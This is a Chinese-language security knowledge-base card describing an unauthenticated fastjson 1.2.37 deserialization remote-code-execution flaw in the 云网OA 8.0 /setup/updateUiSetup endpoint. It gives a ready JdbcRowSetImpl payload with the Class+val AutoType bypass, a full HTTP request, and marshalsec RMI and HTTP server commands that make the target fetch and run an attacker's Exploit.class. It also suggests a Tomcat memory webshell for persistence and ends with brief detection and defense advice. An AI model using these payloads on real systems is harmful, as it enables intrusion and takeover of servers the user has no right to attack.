---
id: web-java-deser-fastjson-cloudweb-updateuisetup-jdbcrowset-jndi
title: 云网OA /setup/updateUiSetup 未授权 uiSetup 参数 parseObject：fastjson 1.2.37 JdbcRowSetImpl JNDI RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: cloudweb-updateuisetup-fastjson-parseobject-jdbcrowset-jndi
tags:
- java
- fastjson
- deserialization
- jndi
- jdbcrowsetimpl
- rce
- oa
- cloudweb
cve: []
severity: critical
confidence: high
affected_versions: fastjson 1.2.37（原文标注）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V582
  verified_at: '2026-11-12T12:50:31+08:00'
  notes: 已对照原文（174 行）与全部 22 张截图核对：图01 ApplicationController.updateUiSetup 中 JSONObject.parseObject(uiSetup)；图02 marshalsec RMIRefServer 1389 日志 Is RMI.lookup call for Exploit 2 / Sending remote classloading stub targeting http://127.0.0.1:8000/Exploit.class；图03 POST /oa//setup/updateUiSetup 请求及响应（HTTP/1.1 200，body code:500 set property error, autoCommit）；图04 调试器断点处 uiSetup 值即恶意 JSON；图05 计算器弹出。卡中入口、参数、payload、marshalsec 命令与原文一致。修正：原文版本 fastjson 1.2.37 于 1.2.25 起 autoTypeSupport 默认关闭，卡原写'AutoType 默认可用'与'HTTP 响应返回 500'不准确，已改为'Class+val 类缓存绕过（MiscCodec→TypeUtils.loadClass→mappings 缓存，checkAutoType 先查缓存）'与'接口 JSON code:500（HTTP 200）'。affected_versions=fastjson 1.2.37（原文标注）保留；未在本机复跑；无 sources/source_url。dedup 为 append_scenario（唯一 likely_duplicate 为通用 web-java-deser-fastjson-jdbc-rowset，无产品入口/版本），本卡为产品级入口且自 1.2.37 具体版本，与汉王等产品级 parseObject 卡先例一致，保留合理。
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-cloudweb-updateuisetup-jdbcrowset-jndi/
draft: false
kb_aliases:
- 云网OA fastjson
- updateUiSetup 反序列化
- uiSetup parseObject
- fastjson 1.2.37 JdbcRowSetImpl
- cloudweb fastjson RCE
---

## 一句话结论

云网OA 8.0 的 `/oa/setup/updateUiSetup` 接口把请求参数 `uiSetup` 直接交给 `JSONObject.parseObject`（fastjson 1.2.37，AutoType 默认关闭，但可用 `java.lang.Class`+`val` 类缓存技巧绕过），且 Spring Security 将 `/setup/**` 整体放行；未认证攻击者提交带 `@type` 的 `JdbcRowSetImpl` 载荷即可让服务端发起 JNDI 回连，加载远程恶意类执行命令。

## 原理

- 入口：`com.cloudweb.oa.controller.ApplicationController#updateUiSetup`，`@RequestMapping("/setup/updateUiSetup")`，方法参数 `@RequestParam String uiSetup`，随后 `JSONObject json = JSONObject.parseObject(uiSetup)`。
- fastjson 从 1.2.25 起 `autoTypeSupport` 默认关闭，但 1.2.37 可用 `java.lang.Class`+`val` 的类缓存技巧绕过 AutoType 限制：`MiscCodec` 处理 `java.lang.Class` 时对 `val` 调 `TypeUtils.loadClass` 并把类写入全局 mappings 缓存，`checkAutoType` 在黑名单/autoTypeSupport 检查之前先查该缓存，因此第二个对象里的 `@type` 可正常实例化 `com.sun.rowset.JdbcRowSetImpl`。其 `setDataSourceName` 保存 JNDI 名称，`setAutoCommit(true)` 触发 `connect()` → `InitialContext.lookup(dataSourceName)`。
- 载荷中用 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` 先把类放入 fastjson 的类缓存（兼容不同版本/黑名单细节），再在 `b` 中实例化 `JdbcRowSetImpl` 并设置 `dataSourceName` 为 `rmi://attacker:1389/Exploit`、`autoCommit=true`。
- `/setup/**` 在 Spring Security 配置中被 permitAll（安装向导需要匿名访问），安装完成后未下线，导致该接口可未授权访问。
- 远程 JNDI 服务：marshalsec `RMIRefServer` 监听 1389，将 lookup 重定向到 `http://attacker:8000/#Exploit`，再加载攻击者 HTTP 上的 `Exploit.class`，静态块执行命令。即使接口返回 JSON `code:500`（`set property error, autoCommit`；截图显示 HTTP 状态码为 200），JNDI 回连与命令执行已发生。

## 触发条件

- 目标运行云网OA 8.0，使用 fastjson 1.2.37（AutoType 默认关闭，可经 `java.lang.Class`+`val` 类缓存技巧绕过）。
- `/setup/**` 未被下线或未加认证，`/oa/setup/updateUiSetup` 可未认证访问。
- 目标可出网访问攻击者的 RMI/LDAP 与 HTTP 类服务器。
- 目标 JDK 允许远程 codebase（低版本；高版本需换本地工厂/序列化 gadget）。

## 利用步骤

1. 攻击机启动恶意 JNDI 服务与 HTTP 类服务：
   ```bash
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER:8000/#Exploit" 1389
   python -m http.server 8000
   ```
2. 编译并放置 `Exploit.class`（静态块或构造函数执行命令）到 HTTP 根目录。
3. 向目标发送未认证请求（`Content-Type: application/x-www-form-urlencoded`）：
   ```http
   POST /oa//setup/updateUiSetup HTTP/1.1
   Host: TARGET:8096
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 196

   uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" },"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER:1389/Exploit","autoCommit":true}}
   ```
4. 观察 marshalsec 日志出现 `RMI.lookup call for Exploit` / `Sending remote classloading stub`，目标加载 `Exploit.class` 执行命令；接口可能返回 JSON `code:500`（HTTP 200）属正常。
5. 后续可结合 `/setup/**` 的重装能力改管理员密码、设置文件上传路径等（见关联卡）。

## PoC

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" },"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER:1389/Exploit","autoCommit":true}}
```

```bash
# 恶意 JNDI 服务（marshalsec）
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER:8000/#Exploit" 1389
python -m http.server 8000
```

## 变体与关联

- 变体：`dataSourceName` 改为 `ldap://` 并使用 LDAP 服务返回 Reference/序列化数据；高版本 JDK 下改用本地工厂型或纯反序列化 gadget。
- 变体：把 `Exploit` 换成 Tomcat Filter 内存马类，获得持久化 webshell。
- 关联：[[web-java-deser-fastjson-jdbc-rowset]]（通用 JdbcRowSetImpl JNDI 原理）、[[web-java-deser-fastjson-hanvon-addappointment-jdbcrowset-jndi]]（同型的产品级 parseObject 入口）、[[web-generic-auth-oa-setup-unauth-reinstall-admin-password]]（同一 `/setup/**` 放行导致的未授权重装改管理员密码）。
- 边界：fastjson 开启 safeMode 或升级到 AutoType 关闭版本、`/setup/**` 被下线/加鉴权、目标不能出网时失效。

## 检测与防御

- 检测：请求参数中出现 `@type`、`JdbcRowSetImpl`、`dataSourceName`、`ldap://`/`rmi://`；应用向陌生 1389/1099 或 LDAP 端口发起连接；marshalsec/LDAP 服务端出现来自目标主机的 lookup。
- 防御：升级 fastjson 并开启 safeMode/AutoType 白名单；安装完成后删除或下线 setup 路由并在网关层拒绝 `/setup/**`；限制应用出网到 JNDI 端口；升级 JDK 并配置 `jdk.serialFilter`。
